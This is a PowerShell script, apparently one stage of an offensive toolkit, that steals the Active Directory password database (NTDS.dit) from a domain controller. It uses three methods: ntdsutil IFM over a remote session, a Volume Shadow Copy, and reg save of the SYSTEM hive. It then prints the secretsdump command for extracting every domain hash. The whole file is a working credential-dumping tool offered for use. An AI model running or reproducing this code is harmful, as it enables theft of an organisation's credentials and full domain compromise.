# === NTDS.dit Extraction (T1003.003) ===
# Extracts Active Directory database using domain admin credentials
# Maps to MITRE ATT&CK T1003.003 - OS Credential Dumping: NTDS

param(
    [string]$DomainController = "",
    [string]$Username = "",
    [string]$Password = "",
    [string]$Domain = "",
    [string]$OutputDirectory = "C:\Intel\Logs",
    [switch]$UseCurrentCredentials = $false
)

$results = @()
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"

Write-Host "[*] Starting NTDS.dit Extraction (T1003.003)..." -ForegroundColor Cyan

try {
    # Verify we have domain admin credentials
    if (-not $UseCurrentCredentials) {
        if (-not $Username -or -not $Password) {
            Write-Host "[!] Domain admin credentials required for NTDS extraction" -ForegroundColor Red
            Write-Host "[!] Use extracted credentials from previous phase" -ForegroundColor Yellow
            throw "Missing domain admin credentials"
        }
        Write-Host "[+] Using provided domain admin credentials: $Username" -ForegroundColor Green
    } else {
        Write-Host "[+] Using current user credentials for NTDS extraction" -ForegroundColor Green
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        Write-Host "[+] Current user: $($currentUser.Name)" -ForegroundColor Green
    }
    
    # Discover Domain Controller if not provided
    if (-not $DomainController) {
        Write-Host "[*] Discovering Domain Controllers..." -ForegroundColor Yellow
        
        try {
            # Method 1: Using AD module if available
            if (Get-Module -Name ActiveDirectory -ListAvailable) {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                $dcs = Get-ADDomainController -Filter * -ErrorAction SilentlyContinue
                if ($dcs) {
                    $DomainController = $dcs[0].HostName
                    Write-Host "[+] Found DC via AD module: $DomainController" -ForegroundColor Green
                }
            }
            
            # Method 2: Using nslookup as fallback
            if (-not $DomainController) {
                $domainName = $env:USERDNSDOMAIN
                if ($domainName) {
                    $nslookupResult = nslookup -type=srv "_ldap._tcp.$domainName" 2>$null
                    $dcLine = $nslookupResult | Select-String "hostname" | Select-Object -First 1
                    if ($dcLine) {
                        $DomainController = ($dcLine -split "=")[1].Trim()
                        Write-Host "[+] Found DC via nslookup: $DomainController" -ForegroundColor Green
                    }
                }
            }
            
            # Method 3: Using nltest as final fallback
            if (-not $DomainController) {
                $nltestResult = nltest /dclist: 2>$null
                if ($LASTEXITCODE -eq 0) {
                    $dcLine = $nltestResult | Select-String "\\\\.*" | Select-Object -First 1
                    if ($dcLine) {
                        $DomainController = ($dcLine -replace ".*\\\\([^\s]+).*", '$1')
                        Write-Host "[+] Found DC via nltest: $DomainController" -ForegroundColor Green
                    }
                }
            }
            
            if (-not $DomainController) {
                throw "Could not discover Domain Controller"
            }
        }
        catch {
            Write-Host "[!] DC discovery failed: $($_.Exception.Message)" -ForegroundColor Red
            $DomainController = "DC01.domain.local"  # Fallback guess
            Write-Host "[!] Using fallback DC name: $DomainController" -ForegroundColor Yellow
        }
    }
    
    Write-Host "[+] Target Domain Controller: $DomainController" -ForegroundColor Green
    
    # Test connectivity to DC
    Write-Host "[*] Testing connectivity to Domain Controller..." -ForegroundColor Yellow
    $pingTest = Test-Connection -ComputerName $DomainController -Count 1 -Quiet -ErrorAction SilentlyContinue
    if ($pingTest) {
        Write-Host "[+] Domain Controller is reachable" -ForegroundColor Green
    } else {
        Write-Host "[!] Domain Controller may not be reachable" -ForegroundColor Yellow
    }
    
    # Prepare output directory
    if (-not (Test-Path $OutputDirectory)) {
        New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
    }
    
    $ntdsOutputDir = Join-Path $OutputDirectory "NTDS_Extraction"
    if (-not (Test-Path $ntdsOutputDir)) {
        New-Item -ItemType Directory -Path $ntdsOutputDir -Force | Out-Null
    }
    
    # Method 1: Using ntdsutil (requires administrative access to DC)
    Write-Host "[*] Attempting NTDS extraction via ntdsutil..." -ForegroundColor Cyan
    
    $ntdsUtilScript = Join-Path $ntdsOutputDir "ntdsutil_extract.cmd"
    $ntdsUtilOutput = Join-Path $ntdsOutputDir "ntds_dump"
    
    $ntdsUtilCommands = @"
ntdsutil
activate instance ntds
ifm
create full "$ntdsUtilOutput"
quit
quit
"@
    
    $ntdsUtilCommands | Out-File -FilePath $ntdsUtilScript -Encoding ASCII
    
    try {
        if ($UseCurrentCredentials) {
            # Run with current credentials
            $ntdsProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$ntdsUtilScript`"" -WorkingDirectory $ntdsOutputDir -NoNewWindow -PassThru -Wait -RedirectStandardOutput "$ntdsOutputDir\ntdsutil_stdout.txt" -RedirectStandardError "$ntdsOutputDir\ntdsutil_stderr.txt"
        } else {
            # Run with provided credentials (requires PSExec or similar)
            Write-Host "[*] Attempting to run ntdsutil with domain admin credentials..." -ForegroundColor Yellow
            Write-Host "[!] This requires PSExec or similar remote execution capability" -ForegroundColor Yellow
            
            # Create credential object
            $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($Username, $securePassword)
            
            # Try to create remote session
            try {
                $session = New-PSSession -ComputerName $DomainController -Credential $credential -ErrorAction Stop
                
                # Execute ntdsutil remotely
                $remoteResult = Invoke-Command -Session $session -ScriptBlock {
                    param($OutputPath)
                    
                    $commands = @"
ntdsutil
activate instance ntds
ifm
create full "$OutputPath"
quit
quit
"@
                    
                    $tempScript = "$env:TEMP\ntdsutil_remote.cmd"
                    $commands | Out-File -FilePath $tempScript -Encoding ASCII
                    
                    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempScript`"" -NoNewWindow -PassThru -Wait
                    return $process.ExitCode
                } -ArgumentList $ntdsUtilOutput
                
                Remove-PSSession $session
                Write-Host "[+] Remote ntdsutil execution completed" -ForegroundColor Green
            }
            catch {
                Write-Host "[!] Remote session creation failed: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "[!] Falling back to local execution" -ForegroundColor Yellow
                
                # Fallback to local execution
                $ntdsProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$ntdsUtilScript`"" -WorkingDirectory $ntdsOutputDir -NoNewWindow -PassThru -Wait -RedirectStandardOutput "$ntdsOutputDir\ntdsutil_stdout.txt" -RedirectStandardError "$ntdsOutputDir\ntdsutil_stderr.txt"
            }
        }
        
        # Check if ntdsutil succeeded
        if (Test-Path "$ntdsUtilOutput\Active Directory\ntds.dit") {
            Write-Host "[+] NTDS.dit successfully extracted!" -ForegroundColor Green
            
            $ntdsSize = (Get-Item "$ntdsUtilOutput\Active Directory\ntds.dit").Length
            $ntdsSizeMB = [math]::Round($ntdsSize / 1MB, 2)
            
            $results += [PSCustomObject]@{
                Method = "ntdsutil"
                Status = "Success"
                File = "$ntdsUtilOutput\Active Directory\ntds.dit"
                Size = "$ntdsSizeMB MB"
                SystemHive = "$ntdsUtilOutput\Registry\SYSTEM"
                SecurityHive = "$ntdsUtilOutput\Registry\SECURITY"
                Timestamp = $timestamp
                Details = "Complete NTDS database extraction with registry hives"
                Notes = "Use impacket-secretsdump or similar to extract hashes"
            }
            
            Write-Host "[+] NTDS.dit size: $ntdsSizeMB MB" -ForegroundColor Green
            Write-Host "[+] Registry hives also extracted" -ForegroundColor Green
        } else {
            Write-Host "[!] ntdsutil extraction may have failed" -ForegroundColor Red
            
            # Check output files for errors
            if (Test-Path "$ntdsOutputDir\ntdsutil_stderr.txt") {
                $errorOutput = Get-Content "$ntdsOutputDir\ntdsutil_stderr.txt" -Raw
                if ($errorOutput) {
                    Write-Host "[!] ntdsutil errors: $errorOutput" -ForegroundColor Red
                }
            }
        }
    }
    catch {
        Write-Host "[!] ntdsutil execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Method 2: Using vssadmin (Volume Shadow Copy)
    Write-Host "[*] Attempting NTDS extraction via Volume Shadow Copy..." -ForegroundColor Cyan
    
    try {
        # Create shadow copy
        $vssOutput = vssadmin create shadow /for=C: 2>&1
        $shadowCopyPath = $vssOutput | Select-String "Shadow Copy Volume: (.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value }
        
        if ($shadowCopyPath) {
            Write-Host "[+] Shadow copy created: $shadowCopyPath" -ForegroundColor Green
            
            # Copy NTDS.dit from shadow copy
            $shadowNtdsPath = "$shadowCopyPath\Windows\NTDS\ntds.dit"
            $localNtdsPath = Join-Path $ntdsOutputDir "ntds_shadow.dit"
            
            if (Test-Path $shadowNtdsPath) {
                Copy-Item $shadowNtdsPath $localNtdsPath -ErrorAction Stop
                
                # Also copy SYSTEM registry hive
                $shadowSystemPath = "$shadowCopyPath\Windows\System32\config\SYSTEM"
                $localSystemPath = Join-Path $ntdsOutputDir "SYSTEM_shadow"
                
                if (Test-Path $shadowSystemPath) {
                    Copy-Item $shadowSystemPath $localSystemPath -ErrorAction Stop
                }
                
                $ntdsSize = (Get-Item $localNtdsPath).Length
                $ntdsSizeMB = [math]::Round($ntdsSize / 1MB, 2)
                
                $results += [PSCustomObject]@{
                    Method = "Volume Shadow Copy"
                    Status = "Success"
                    File = $localNtdsPath
                    Size = "$ntdsSizeMB MB"
                    SystemHive = $localSystemPath
                    SecurityHive = "N/A"
                    Timestamp = $timestamp
                    Details = "NTDS extraction via VSS shadow copy"
                    Notes = "Requires SYSTEM registry hive for hash extraction"
                }
                
                Write-Host "[+] NTDS.dit copied from shadow copy ($ntdsSizeMB MB)" -ForegroundColor Green
            } else {
                Write-Host "[!] NTDS.dit not found in shadow copy" -ForegroundColor Red
            }
            
            # Cleanup shadow copy
            vssadmin delete shadows /shadow=$($shadowCopyPath.Split('\')[3]) /quiet 2>$null
        } else {
            Write-Host "[!] Shadow copy creation failed" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[!] Volume Shadow Copy extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Method 3: Using reg save for SYSTEM hive (if not already obtained)
    Write-Host "[*] Ensuring SYSTEM registry hive is available..." -ForegroundColor Yellow
    
    $systemHivePath = Join-Path $ntdsOutputDir "SYSTEM_reg"
    if (-not (Test-Path $systemHivePath)) {
        try {
            reg save HKLM\SYSTEM $systemHivePath /y 2>$null
            if (Test-Path $systemHivePath) {
                Write-Host "[+] SYSTEM registry hive saved" -ForegroundColor Green
            }
        }
        catch {
            Write-Host "[!] Could not save SYSTEM registry hive" -ForegroundColor Yellow
        }
    }
    
    # Generate extraction summary
    if ($results.Count -gt 0) {
        Write-Host ""
        Write-Host "NTDS Extraction Summary:" -ForegroundColor Cyan
        Write-Host "- Domain Controller: $DomainController" -ForegroundColor White
        Write-Host "- Extraction Methods: $($results.Count)" -ForegroundColor White
        Write-Host "- Output Directory: $ntdsOutputDir" -ForegroundColor White
        Write-Host "- Timestamp: $timestamp" -ForegroundColor White
        
        foreach ($result in $results) {
            Write-Host "- Method: $($result.Method) - Status: $($result.Status)" -ForegroundColor White
            if ($result.Status -eq "Success") {
                Write-Host "  File: $($result.File)" -ForegroundColor Gray
                Write-Host "  Size: $($result.Size)" -ForegroundColor Gray
            }
        }
        
        Write-Host ""
        Write-Host "[!] CRITICAL: NTDS.dit contains domain password hashes" -ForegroundColor Red
        Write-Host "[!] Use impacket-secretsdump or similar to extract credentials:" -ForegroundColor Red
        Write-Host "[!] secretsdump.py -ntds ntds.dit -system SYSTEM local" -ForegroundColor Yellow
    } else {
        Write-Host ""
        Write-Host "[!] No successful NTDS extractions completed" -ForegroundColor Red
        Write-Host "[!] Verify domain admin credentials and DC access" -ForegroundColor Yellow
    }
    
    return $results
    
} catch {
    Write-Host "[!] NTDS extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    
    # Fallback: Document the attack path
    $results += [PSCustomObject]@{
        Method = "Documentation"
        Status = "Failed"
        File = "N/A"
        Size = "N/A"
        SystemHive = "N/A"
        SecurityHive = "N/A"
        Timestamp = $timestamp
        Details = "NTDS extraction attempted but failed: $($_.Exception.Message)"
        Notes = "Requires valid domain admin credentials and DC access"
    }
    
    return $results
}